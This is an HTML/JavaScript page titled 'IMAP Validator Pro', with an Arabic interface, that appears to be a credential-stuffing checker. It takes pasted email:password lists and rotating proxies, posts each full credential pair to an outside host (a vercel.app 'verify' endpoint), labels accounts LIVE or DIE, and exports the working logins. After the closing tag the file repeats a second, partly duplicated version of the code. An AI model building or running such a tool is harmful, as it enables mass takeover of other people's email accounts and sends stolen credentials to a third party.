<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IMAP Validator Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body class="bg-[#0f172a] text-slate-200 min-h-screen p-4 md:p-8">

    <div class="max-w-6xl mx-auto">
        <div class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
            <h1 class="text-3xl font-black bg-gradient-to-r from-blue-400 to-emerald-400 bg-clip-text text-transparent">نظام فحص الحسابات v2.0</h1>
            <div class="flex gap-2">
                <button onclick="downloadResults('success')" class="bg-emerald-600/20 text-emerald-400 border border-emerald-600/50 px-4 py-2 rounded-lg text-sm hover:bg-emerald-600 hover:text-white transition">تحميل الناجح</button>
                <button onclick="downloadResults('failed')" class="bg-red-600/20 text-red-400 border border-red-600/50 px-4 py-2 rounded-lg text-sm hover:bg-red-600 hover:text-white transition">تحميل الفاشل</button>
            </div>
        </div>

        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
            <div class="bg-slate-800/50 border border-slate-700 p-5 rounded-2xl text-center"><p class="text-slate-400 text-sm">الإجمالي</p><p id="totalCount" class="text-3xl font-bold">0</p></div>
            <div class="bg-slate-800/50 border border-slate-700 p-5 rounded-2xl text-center border-b-4 border-b-blue-500"><p class="text-slate-400 text-sm">جاري الفحص</p><p id="checkingCount" class="text-3xl font-bold text-blue-400">0</p></div>
            <div class="bg-slate-800/50 border border-slate-700 p-5 rounded-2xl text-center border-b-4 border-b-emerald-500"><p class="text-slate-400 text-sm">ناجح (LIVE)</p><p id="successCount" class="text-3xl font-bold text-emerald-400">0</p></div>
            <div class="bg-slate-800/50 border border-slate-700 p-5 rounded-2xl text-center border-b-4 border-b-red-500"><p class="text-slate-400 text-sm">فاشل (DIE)</p><p id="failCount" class="text-3xl font-bold text-red-400">0</p></div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div class="lg:col-span-1 space-y-6 bg-slate-800 p-6 rounded-2xl border border-slate-700 shadow-xl">
                <textarea id="accountsInput" class="w-full h-64 bg-slate-900 border border-slate-700 rounded-xl p-4 text-sm outline-none" placeholder="الحسابات بصيغة email:pass"></textarea>
                <textarea id="proxyInput" class="w-full h-32 bg-slate-900 border border-slate-700 rounded-xl p-4 text-sm outline-none" placeholder="البروكسي (اختياري) ip:port:user:pass"></textarea>
                <button onclick="startValidation()" id="startBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl transition-all shadow-lg">بدء تشغيل النظام</button>
            </div>

            <div class="lg:col-span-2 bg-slate-800 rounded-2xl border border-slate-700 overflow-hidden shadow-xl">
                <div class="overflow-x-auto max-h-[600px]"><table class="w-full text-right"><thead class="bg-slate-700/50 sticky top-0"><tr><th class="p-4 text-sm">الحساب</th><th class="p-4 text-sm">البروكسي</th><th class="p-4 text-sm text-center">الحالة</th></tr></thead><tbody id="resultsTable" class="divide-y divide-slate-700"></tbody></table></div>
            </div>
        </div>
    </div>

    <script>
        let successList = []; let failedList = []; let isRunning = false;
        async function startValidation() {
            const accounts = document.getElementById('accountsInput').value.trim().split('\n');
            const proxies = document.getElementById('proxyInput').value.trim().split('\n').filter(p => p !== "");
            const table = document.getElementById('resultsTable');
            const btn = document.getElementById('startBtn');
            if (!accounts[0]) return alert("أدخل حسابات للفحص");

            isRunning = true; btn.disabled = true; btn.innerText = 'جاري التحقق...';
            document.getElementById('totalCount').innerText = accounts.length;
            let s = 0, f = 0, c = 0;

            for (let account of accounts) {
                if (!isRunning || !account.includes(':')) continue;
                c++; document.getElementById('checkingCount').innerText = c;
                const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : "مباشر";
                const row = table.insertRow(0);
                row.className = "bg-slate-800/30";
                row.insertCell(0).innerText = account.split(':')[0];
                row.insertCell(1).innerText = proxy;
                const statusCell = row.insertCell(2);
                statusCell.className = "p-4 text-center font-bold text-blue-400";
                statusCell.innerText = "جاري الاتصال...";

                try {
                    const response = await fetch('https://mytu-beige.vercel.app/api/verify', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ account: account.trim(), proxy: proxy })
                    });
                    const data = await response.json();
                    if (data.status === 'SUCCESS') {
                        statusCell.innerHTML = '<span class="text-emerald-500">LIVE</span>';
                        successList.push(account); s++; document.getElementById('successCount').innerText = s;
                    } else {
                        statusCell.innerHTML = '<span class="text-red-500">DIE</span>';
                        failedList.push(account); f++; document.getElementById('failCount').innerText = f;
                    }
                } catch (e) { statusCell.innerText = "خطأ"; f++; }
                c--; document.getElementById('checkingCount').innerText = c;
            }
            btn.disabled = false; btn.innerText = 'إعادة التشغيل';
        }

        function downloadResults(type) {
            const list = type === 'success' ? successList : failedList;
            if (list.length === 0) return alert("لا توجد نتائج");
            const blob = new Blob([list.join('\n')], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `results_${type}.txt`;
            a.click();
        }
    </script>
</body>
</html>
                        <table class="w-full text-right">
                            <thead class="bg-slate-700/50 sticky top-0 backdrop-blur-md">
                                <tr>
                                    <th class="p-4 text-sm font-semibold">الحساب</th>
                                    <th class="p-4 text-sm font-semibold">البروكسي</th>
                                    <th class="p-4 text-sm font-semibold text-center">الحالة</th>
                                </tr>
                            </thead>
                            <tbody id="resultsTable" class="divide-y divide-slate-700">
                                </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let successList = [];
        let failedList = [];
        let isRunning = false;

        async function startValidation() {
            const accounts = document.getElementById('accountsInput').value.trim().split('\n');
            const proxies = document.getElementById('proxyInput').value.trim().split('\n').filter(p => p !== "");
            const table = document.getElementById('resultsTable');
            const btn = document.getElementById('startBtn');

            if (!accounts[0]) return alert("الرجاء إدخال حسابات للفحص");

            isRunning = true;
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner animate-spin"></i> جاري التحقق...';
            
            document.getElementById('totalCount').innerText = accounts.length;
            let s = 0, f = 0, c = 0;

            for (let account of accounts) {
                if (!isRunning) break;
                if (!account.includes(':')) continue;

                c++;
                document.getElementById('checkingCount').innerText = c;
                
                // اختيار بروكسي عشوائي من القائمة
                const selectedProxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : "Direct IP";

                const row = table.insertRow(0);
                row.className = "bg-slate-800/30 animate-pulse";
                row.insertCell(0).className = "p-4 text-sm truncate max-w-[200px]";
                row.cells[0].innerText = account.split(':')[0];
                
                row.insertCell(1).className = "p-4 text-xs text-slate-500";
                row.cells[1].innerText = selectedProxy;

                const statusCell = row.insertCell(2);
                statusCell.className = "p-4 text-center text-xs font-bold uppercase tracking-wider";
                statusCell.innerHTML = '<span class="text-blue-400">جاري الاتصال...</span>';

                try {
                    const response = await fetch('https://mytu-beige.vercel.app/api/verify', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ account: account.trim(), proxy: selectedProxy })
                    });
                    const data = await response.json();

                    row.classList.remove('animate-pulse');
                    if (data.status === 'SUCCESS') {
                        statusCell.innerHTML = '<span class="bg-emerald-500/10 text-emerald-500 px-3 py-1 rounded-full border border-emerald-500/20">LIVE</span>';
                        successList.push(account);
                        s++; document.getElementById('successCount').innerText = s;
                    } else {
                        statusCell.innerHTML = '<span class="bg-red-500/10 text-red-500 px-3 py-1 rounded-full border border-red-500/20">DIE</span>';
                        failedList.push(account);
                        f++; document.getElementById('failCount').innerText = f;
                    }
                } catch (e) {
                    statusCell.innerHTML = '<span class="text-slate-600 font-normal italic">خطأ شبكة</span>';
                    f++;
                }
                c--;
                document.getElementById('checkingCount').innerText = c;
            }

            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-bolt"></i> إعادة التشغيل';
        }

        function downloadResults(type) {
            const list = type === 'success' ? successList : failedList;
            if (list.length === 0) return alert("لا توجد نتائج لتحميلها");
            
            const blob = new Blob([list.join('\n')], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `results_${type}_${new Date().getTime()}.txt`;
            a.click();
        }
    </script>
</body>
</html>
